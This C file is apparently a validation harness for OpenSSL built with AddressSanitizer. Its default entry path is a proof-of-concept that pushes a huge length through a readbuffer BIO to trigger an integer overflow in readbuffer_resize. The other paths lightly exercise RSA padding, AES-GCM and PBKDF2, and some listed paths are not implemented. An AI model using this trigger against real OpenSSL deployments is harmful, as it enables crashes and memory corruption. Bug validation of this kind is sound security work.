/*
 * Unified Validation Harness — OpenSSL
 *
 * Compile:
 *   gcc -fsanitize=address -g -O0 -w -I<openssl_src>/include \
 *       harness_openssl.c <openssl_src>/libcrypto.a <openssl_src>/libssl.a \
 *       -lm -lpthread -ldl -o test_harness
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include <openssl/bio.h>
#include <openssl/evp.h>
#include <openssl/rsa.h>
#include <openssl/err.h>
#include <openssl/conf.h>
#include <openssl/x509.h>
#include <openssl/x509v3.h>
#include <openssl/asn1.h>

/* ================================================================
 * BASELINE INPUT
 * ================================================================ */

#ifndef TARGET_FUNC
#define TARGET_FUNC  "mem_read"
#define TARGET_FILE  "bss_mem.c"
#define TARGET_LINE  0
#endif

#ifndef ENTRY_PATH
#define ENTRY_PATH "bio_readbuffer"
/* Options: "bio_readbuffer", "bio_mem", "rsa_padding", "evp_cipher",
 *          "asn1_encode", "x509_ext", "kdf", "conf" */
#endif

/* ================================================================
 * Entry path implementations
 * ================================================================ */

static int test_bio_readbuffer(void) {
    /* Creates BIO chain: mem → readbuffer, triggers integer overflow */
    BIO *mem = BIO_new(BIO_s_mem());
    if (!mem) return 1;

    char data[4096];
    memset(data, 'A', sizeof(data));
    for (int i = 0; i < 16; i++)
        BIO_write(mem, data, sizeof(data));

    BIO *rb = BIO_new(BIO_f_readbuffer());
    if (!rb) { BIO_free(mem); return 1; }
    rb = BIO_push(rb, mem);

    char *buf = malloc(65536);
    if (!buf) { BIO_free_all(rb); return 1; }

    /* Small read to advance ibuf_off */
    BIO_read(rb, buf, 4096);

    /* Large read to trigger integer overflow in readbuffer_resize */
    BIO_read(rb, buf, INT_MAX - 8190);

    free(buf);
    BIO_free_all(rb);
    return 0;
}

static int test_bio_mem(void) {
    BIO *bio = BIO_new(BIO_s_mem());
    if (!bio) return 1;

    char data[256];
    memset(data, 'B', sizeof(data));
    BIO_write(bio, data, sizeof(data));

    char out[512];
    BIO_read(bio, out, sizeof(out));
    BIO_free(bio);
    return 0;
}

static int test_rsa_padding(void) {
    /* Test RSA padding functions with edge-case inputs */
    unsigned char from[256], to[256];
    memset(from, 0x42, sizeof(from));

    /* X931 padding with small buffer */
    RSA_padding_add_X931(to, 16, from, 8);
    RSA_padding_check_X931(to, 16, from, 16, 16);
    return 0;
}

static int test_evp_cipher(void) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return 1;

    unsigned char key[32], iv[16];
    memset(key, 0, sizeof(key));
    memset(iv, 0, sizeof(iv));

    EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, key, iv);

    unsigned char in[64], out[128];
    int outl = 0;
    memset(in, 'C', sizeof(in));
    EVP_EncryptUpdate(ctx, out, &outl, in, sizeof(in));
    EVP_EncryptFinal_ex(ctx, out + outl, &outl);

    EVP_CIPHER_CTX_free(ctx);
    return 0;
}

static int test_kdf(void) {
    EVP_KDF *kdf = EVP_KDF_fetch(NULL, "PBKDF2", NULL);
    if (!kdf) return 1;

    EVP_KDF_CTX *kctx = EVP_KDF_CTX_new(kdf);
    EVP_KDF_free(kdf);
    if (!kctx) return 1;

    unsigned char out[32];
    OSSL_PARAM params[5];
    char *pass = "password";
    unsigned char salt[8] = {0};

    params[0] = OSSL_PARAM_construct_octet_string("pass", pass, strlen(pass));
    params[1] = OSSL_PARAM_construct_octet_string("salt", salt, sizeof(salt));
    params[2] = OSSL_PARAM_construct_uint("iter", &(unsigned int){1});
    params[3] = OSSL_PARAM_construct_utf8_string("digest", "SHA256", 0);
    params[4] = OSSL_PARAM_construct_end();

    EVP_KDF_derive(kctx, out, sizeof(out), params);
    EVP_KDF_CTX_free(kctx);
    return 0;
}

/* ================================================================
 * Main
 * ================================================================ */

int main(void) {
    fprintf(stderr, "Target: %s at %s:%d\n", TARGET_FUNC, TARGET_FILE, TARGET_LINE);
    fprintf(stderr, "Entry path: %s\n", ENTRY_PATH);

    if (strcmp(ENTRY_PATH, "bio_readbuffer") == 0) return test_bio_readbuffer();
    if (strcmp(ENTRY_PATH, "bio_mem") == 0) return test_bio_mem();
    if (strcmp(ENTRY_PATH, "rsa_padding") == 0) return test_rsa_padding();
    if (strcmp(ENTRY_PATH, "evp_cipher") == 0) return test_evp_cipher();
    if (strcmp(ENTRY_PATH, "kdf") == 0) return test_kdf();

    fprintf(stderr, "Unknown entry path: %s\n", ENTRY_PATH);
    return 1;
}
